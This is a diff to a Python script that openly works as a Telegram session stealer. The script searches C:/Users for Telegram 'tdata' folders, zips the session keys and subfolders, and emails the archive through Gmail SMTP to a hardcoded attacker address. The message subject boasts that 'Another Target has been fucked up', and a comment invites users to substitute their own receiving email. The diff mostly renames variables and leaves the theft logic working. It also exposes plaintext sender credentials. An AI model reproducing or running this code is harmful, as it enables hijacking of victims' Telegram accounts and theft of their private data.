@@ -1,4 +1,5 @@
 # Script by Ali Safinal
+
 import email
 import smtplib
 import ssl
@@ -27,8 +28,7 @@ def send_gmail_with_file(subject, body, sender_email, receiver_email, password, 
 
     encoders.encode_base64(part)
 
-    part.add_header("Content-Disposition",
-                    f"attachment; filename= {filename}",)
+    part.add_header("Content-Disposition", f"attachment; filename= {filename}",)
 
     message.attach(part)
     text = message.as_string()
@@ -40,49 +40,54 @@ def send_gmail_with_file(subject, body, sender_email, receiver_email, password, 
 
 
 def main():
-    counter = 0
-    for i in os.walk('C:/Users'):
-        if 'tdata' in i[1]:
+    '''
+    Collect and make a zip file of the neccecery sub files and sub dirs for every single tdata folder
+    in "C:/Users" path and send the final zip file to the reciever email using the above function.
+    '''
 
-            dirs = [(os.path.join(os.path.join(i[0], 'tdata'), dI), dI) for dI in os.listdir(os.path.join(i[0], 'tdata')) if os.path.isdir(os.path.join(
-                os.path.join(i[0], 'tdata'), dI)) and dI.find('dumps') == -1 and dI.find('emoji') == -1 and dI.find('user_data') == -1 and dI.find('tdummy') == -1]
+    tdata_counter = 0
+    for root, folders, files in os.walk('C:/Users'):
+        if 'tdata' in folders:
 
-            files = [os.path.join(os.path.join(i[0], 'tdata'), dI) for dI in os.listdir(os.path.join(
-                i[0], 'tdata')) if not os.path.isdir(os.path.join(os.path.join(i[0], 'tdata'), dI)) if dI == 'key_datas' or dI[:-1] in [x[1] for x in dirs]]
+            tdata_sub_dirs = [(os.path.join(os.path.join(root, 'tdata'), dir_name), dir_name) for dir_name in os.listdir(os.path.join(root, 'tdata')) if os.path.isdir(os.path.join(
+                os.path.join(root, 'tdata'), dir_name)) and dir_name.find('dumps') == -1 and dir_name.find('emoji') == -1 and dir_name.find('user_data') == -1 and dir_name.find('tdummy') == -1]
 
-            count = 0
-            dir_names = []
-            for j in dirs:
-                count += 1
-                dir_names.append(j[1])
-                shutil.make_archive(f'{dir_names[-1]}', 'zip', j[0])
+            tdata_sub_files = [os.path.join(os.path.join(root, 'tdata'), file_name) for file_name in os.listdir(os.path.join(
+                root, 'tdata')) if not os.path.isdir(os.path.join(os.path.join(root, 'tdata'), file_name)) if file_name == 'key_datas' or file_name[:-1] in [sub_dir[1] for sub_dir in tdata_sub_dirs]]
 
-            counter += 1
-            with ZipFile(f'recieved{counter}.zip', 'w') as zipObje:
-                for j in range(1, count+1):
-                    zipObje.write(f'{dir_names[j-1]}.zip')
-                for j in files:
-                    zipObje.write(j, basename(j))
+            tdata_sub_dirs_counter = 0
+            tdata_sub_dirs_names = []
 
-            for i in range(1, count+1):
-                if os.path.exists(f'{dir_names[i-1]}.zip'):
-                    os.remove(f'{dir_names[i-1]}.zip')
+            for sub_dir in tdata_sub_dirs:
+                tdata_sub_dirs_counter += 1
+                tdata_sub_dirs_names.append(sub_dir[1])
+                shutil.make_archive(f'{tdata_sub_dirs_names[-1]}', 'zip', sub_dir[0])
 
-    with ZipFile('final.zip', 'w') as zipObj1:
-        for i in range(1, counter+1):
-            zipObj1.write(f'recieved{i}.zip')
+            tdata_counter += 1
+            with ZipFile(f'recieved{tdata_counter}.zip', 'w') as zip_obj:
+                for i in range(tdata_sub_dirs_counter):
+                    zip_obj.write(f'{tdata_sub_dirs_names[i]}.zip')
 
-    for i in range(1, counter+1):
-        if os.path.exists(f'recieved{i}.zip'):
-            os.remove(f'recieved{i}.zip')
+                for sub_file in tdata_sub_files:
+                    zip_obj.write(sub_file, basename(sub_file))
+
+            for i in range(tdata_sub_dirs_counter):
+                if os.path.exists(f'{tdata_sub_dirs_names[i]}.zip'):
+                    os.remove(f'{tdata_sub_dirs_names[i]}.zip')
+
+    with ZipFile('final.zip', 'w') as zip_obj:
+        for i in range(tdata_counter):
+            zip_obj.write(f'recieved{i+1}.zip')
+
+    for i in range(tdata_counter):
+        if os.path.exists(f'recieved{i+1}.zip'):
+            os.remove(f'recieved{i+1}.zip')
 
     # if you want to get the email change 'robdin64@gmail.com' to your email
-    send_gmail_with_file("Another Target has been fucked up!!!", "Look what do we have here!",
-                         'howy9914@gmail.com', 'robdin64@gmail.com', 'slgdaldagpf658416', "final.zip")
+    send_gmail_with_file("Another Target has been fucked up!!!", "Look what do we have here!", 'howy9914@gmail.com', 'robdin64@gmail.com', 'slgdaldagpf658416', "final.zip")
     if os.path.exists('final.zip'):
         os.remove('final.zip')
 
 
-main()
-
-# Script by Ali Safinal
+if __name__ == '__main__':
+    main()
